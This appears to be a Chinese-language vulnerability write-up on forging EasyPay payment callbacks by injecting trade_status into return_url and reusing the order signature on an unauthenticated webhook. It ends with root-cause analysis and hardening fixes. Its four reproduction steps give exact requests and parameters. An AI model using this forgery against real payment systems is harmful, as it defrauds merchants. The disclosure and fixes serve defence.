完整可运行脚本见落盘文件（easypay_forge_callback.py）。核心逻辑四步：

步骤 1：用普通用户账号下单，return_url 里塞 trade_status=TRADE_SUCCESS
POST /api/v1/payment/orders
Content-Type: application/json
{"amount":1,"payment_type":"alipay","order_type":"balance","is_mobile":false,"payment_source":"hosted_redirect",
 "return_url":"https://<SITE>/payment/result?trade_status=TRADE_SUCCESS"}
→ 响应 data.pay_url（popup 模式下是上游 submit.php 的跳转 URL），从里面读出全部参数：
  pid / type / out_trade_no / notify_url / name / money / return_url / sign / sign_type
  其中 return_url 解码后形如
  https://<SITE>/payment/result?order_id=<ID>&out_trade_no=<OTN>&resume_token=<TOKEN>&status=success&trade_status=TRADE_SUCCESS
  —— 用户注入的 trade_status 被服务端原样保留并排在值的最末（服务端按 key 重排重编码，t 排在 s 之后）

步骤 2：把 return_url 截断到 status=success 为止（丢掉 &trade_status=TRADE_SUCCESS）

步骤 3：构造回调 body，让 trade_status 以裸 & 升为顶层参数，sign 用步骤 1 读到的下单签名
money=<money>&name=<name 编码>&notify_url=<notify_url 编码>&out_trade_no=<OTN>&pid=<pid>
&return_url=<前缀，编码到 status%3Dsuccess>&trade_status=TRADE_SUCCESS&sign=<下单 sign>&sign_type=MD5&type=<type>

步骤 4：POST 到 /api/v1/payment/webhook/easypay（无需认证）
→ HTTP 200 body "success" 即验签通过；随后查 /api/v1/payment/orders/<ID> 应为 COMPLETED，
  /api/v1/user/profile 的 balance 增加对应金额。

为什么成立：服务端 easyPaySign 把参数值原样拼进签名串（值里的 & 直接成为签名串分隔符），回调验签又按 key 重排拼接；
只要"回调解析出的参数集"与"下单参数集"拼接后逐字节相同，签名即复用成功——攻击者不需要 pkey。
配合 CanonicalizeReturnURL 未剥离用户 query + popup 模式把下单签名回显给付款人，形成零密钥伪造入账。

加固（来自 issue 修复建议）：① CanonicalizeReturnURL 里 parsed.RawQuery="" 剥离用户 query；
② VerifyNotification 增加回调参数白名单（pid/trade_no/out_trade_no/type/name/money/trade_status/param/sign/sign_type），
出现白名单外参数直接拒绝；③ 入账后异步调上游 api.php 复核订单；④ 改用非 popup 模式（扫码/mapi）可临时缓解。